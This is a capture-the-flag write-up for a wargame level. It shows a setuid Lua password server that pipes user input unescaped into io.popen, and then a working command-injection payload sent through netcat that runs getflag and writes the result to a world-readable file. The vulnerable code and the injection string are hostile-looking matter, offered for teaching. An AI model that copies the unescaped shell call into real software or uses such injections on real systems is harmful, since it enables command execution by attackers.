# Level 11


<br>

### >> [Flag file](../flag) <<

<br>


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
> d--x--x--x  1 root    users    340 Aug 30  2015 ..
> -r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
> -r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
> -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
> -r-x------  1 level11 level11  675 Apr  3  2012 .profile
> ```

- Inside of it:
```bash
cat level11.lua
```

> ```lua
> #!/usr/bin/env lua
> local socket = require("socket")
> local server = assert(socket.bind("127.0.0.1", 5151))
>
> function hash(pass)
>   prog = io.popen("echo "..pass.." | sha1sum", "r")
>   data = prog:read("*all")
>   prog:close()
>
>   data = string.sub(data, 1, 40)
>
>   return data
> end
>
>
> while 1 do
>   local client = server:accept()
>   client:send("Password: ")
>   client:settimeout(60)
>   local l, err = client:receive()
>   if not err then
>       print("trying " .. l)
>       local h = hash(l)
>
>       if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
>           client:send("Erf nope..\n");
>       else
>           client:send("Gz you dumb*\n")
>       end
>
>   end
>
>   client:close()
> end
> ```
> We can clearly see that the password is hashed with `sha1sum` inside a non-escaped `io.popen` call, which is vulnerable to command injection.


#### Step 2:

- To make it work, the final command that is executed can be:
```bash
echo `getflag > /tmp/flag && chmod 777 /tmp/flag` | sha1sum
```

- Let's try to inject a command to get the flag:
```bash
nc 127.0.0.1 5151 << 'EOF'  # Simple quote to avoid variable expansion
`getflag > /tmp/flag && chmod 777 /tmp/flag`
EOF
```


#### Step 3:

- Get the output flag:
```bash
cat /tmp/flag
```


<br>

---

[<<](/level10/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; >>
